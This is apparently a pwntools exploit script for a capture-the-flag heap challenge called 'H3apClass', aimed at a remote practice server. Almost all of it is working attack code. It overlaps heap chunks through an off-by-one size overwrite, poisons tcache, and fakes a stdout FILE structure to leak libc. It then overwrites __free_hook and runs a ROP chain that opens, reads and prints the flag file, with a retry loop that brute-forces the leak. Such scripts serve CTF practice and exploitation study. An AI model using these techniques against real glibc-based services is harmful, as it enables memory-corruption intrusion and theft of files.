# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './H3apClass'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28497'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('4:Drop homework\n',num)

def add(idx,size , content):
    cmd(1)
    sla('Which homework?' , idx)
    sla('size:\n' , size)
    sa('content:\n' , content)

def edit(idx, content):
    cmd(3)
    sla('Which homework?' , idx)
    sa('content:\n' , content)

def delete(idx):
    cmd(4)
    sla('Which homework?' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    add(0 , 0xf8 , 'a'*0xf8)
    add(1 , 0xf8 , 'a'*0xf8)
    add(2 , 0xf8 , 'a'*0xf8)
    add(3 , 0xf8 , 'a'*0xf8)
    add(4 , 0xf8 , 'a'*0xf8)
    add(5 , 0xf8 , 'a')
    add(6 , 0xf8 , 'a')

    edit(0 , 'a'*0xf8 + p16(0x501))
    delete(1)
    delete(6)
    delete(2)
    add( 1 , 0xd8 , 'a'*0xd8 )
    add( 2 , 0x18 , 'a'*0x18 )
    add( 6 , 0x18 , p16(0xc6a0))
    delete(1)
    delete(2)

    fake_io = flat(
        0xfbad1800 , 0,
        0,0,
    )
    add(1, 0xf8 ,'a')
    add(2, 0xf8 ,fake_io + '\x00' )
    leak = l64()
    if(leak == 0):
        exit(0)

    lg('leak' , leak)

    libc.address = leak - libc.sym['_IO_2_1_stdin_']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']

    delete(4)
    delete(0)
    delete(3)
    add(0 , 0xc8 , 'a')
    add(3 , 0xc8 , p64(__free_hook)*8 )
    delete(0)
    
    # 下面 2.31 标准开启 orw
    __free_hook = libc.sym['__free_hook']
    magic = 0x157d8a + libc.address
    
    # svcudp_reply+26
    # mov    rbp, qword ptr [rdi + 0x48]
    # mov    rax, qword ptr [rbp + 0x18]
    # lea    r13, [rbp + 0x10]
    # mov    dword ptr [rbp + 0x10], 0
    # mov    rdi, r13
    # call   qword ptr [rax + 0x28]
    
    read_addr = libc.sym['read']
    open_addr = libc.sym['open']
    puts_addr = libc.sym['puts']
    leave_ret = libc.search(asm('leave;ret')).next()
    pop_rax_ret = libc.search(asm('pop rax; ret')).next()
    pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
    pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
    pop_r13_pop_r15_ret = libc.search(asm('pop r13 ; pop r15 ; ret')).next()
    pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()
    ret = pop_rdi_ret + 1
    
    magic_chain  = flat(
        __free_hook + 0x8, pop_r13_pop_r15_ret , 
        __free_hook + 0x8, __free_hook + 0x10 ,
        pop_rdx_pop_rbx_ret, 0x300 ,
        leave_ret, pop_rsi_ret,
        __free_hook + 0x8 , pop_rdi_ret , 
        0 , read_addr 
    )
    # len magic_chain 0x60
    flag_addr = __free_hook + 0x100 + len(magic_chain) + 8
    chain = flat(
        pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , open_addr,
        pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , read_addr,
        pop_rdi_ret , flag_addr , puts_addr
    ).ljust(0x100,'\x00') + 'flag\x00'
    # len chain 0x80
    
    payload = flat( magic ) + magic_chain
    # dbg('free')
    
    getflag =p64(ret)*0xc + chain
    
    add(0 , 0xf8 , 'a')
    add(4 , 0xf8 , payload)
    # dbg('free')
    delete(4)
    se(getflag)

    # p.success(getShell())
    p.interactive()

# attack()
exhaust(attack)

'''
@File    :   H3apClass.py
@Time    :   2021/11/07 12:23:22
@Author  :   Niyah 
'''